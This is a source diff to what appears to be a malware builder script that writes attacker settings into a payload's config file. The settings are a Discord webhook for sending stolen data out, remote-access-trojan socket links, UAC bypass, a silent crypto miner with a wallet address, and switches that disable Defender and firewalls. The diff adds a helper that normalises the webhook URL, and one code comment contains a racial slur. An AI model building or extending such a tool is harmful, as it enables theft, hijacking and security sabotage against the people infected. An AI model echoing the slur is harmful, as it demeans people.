@@ -226,12 +226,23 @@ def _makebuild(q: Queue, data_builder) -> str:
         except Exception as e:
             logger.error(f"Error in get_files: {e}")
 
+    # chatgpt on top because the niggers from dhooks are too braindead to fix their shit (i am too lol)
+    def replace_discord_url(url):
+        # Check if the URL matches the pattern
+        match = re.match(r"https:\/\/discordapp\.com\/api\/webhooks\/\d+\/[A-Za-z0-9_-]+", url)
+        if match:
+        # Replace 'discordapp.com' with 'discord.com'
+            new_url = match.group(0).replace('discordapp.com', 'discord.com')
+            return new_url
+        else:
+            return None
+
     def edit_config():
         try:
             logger.info("Entered edit_config")
             with open(f"{path}\\config.py","r",encoding="utf-8") as f:
                 text = f.read()
-                new = text.replace("WEBHOOK_URL", f"{data_builder['webhook_url']}") \
+                new = text.replace("WEBHOOK_URL", f"{replace_discord_url(data_builder['webhook_url'])}") \
                 .replace("rose_discord_rat = False", f"rose_discord_rat = {data_builder['rose_rat']}") \
                 .replace("ROSE_DISCORD_RAT_SOCKET_LINK", f"{data_builder['rose_rat_url']}") \
                 .replace("knight_discord_rat = False", f"knight_discord_rat = {data_builder['knight_rat']}") \
@@ -249,7 +260,7 @@ def _makebuild(q: Queue, data_builder) -> str:
                 .replace("screenshot = False", f"screenshot = {data_builder['screenshot']}") \
                 .replace("discord_ping = False", f"discord_ping = {data_builder['ping']}") \
                 .replace("uac_bypass = False", f"uac_bypass = {data_builder['uac_bypass']}") \
-                .replace("silent_crypto_miner = False", f"{data_builder['silent_crypto_miner']}") \
+                .replace("silent_crypto__miner = False", f"silent_crypto__miner = {data_builder['silent_crypto_miner']}") \
                 .replace("_WALLET_ADR_HERE", f"{data_builder['wallet_adress']}") \
                 .replace("disable_defender = False", f"disable_defender = {data_builder['disable_defender']}") \
                 .replace("disable_firewalls = False", f"disable_firewalls = {data_builder['disable_firewalls']}") \
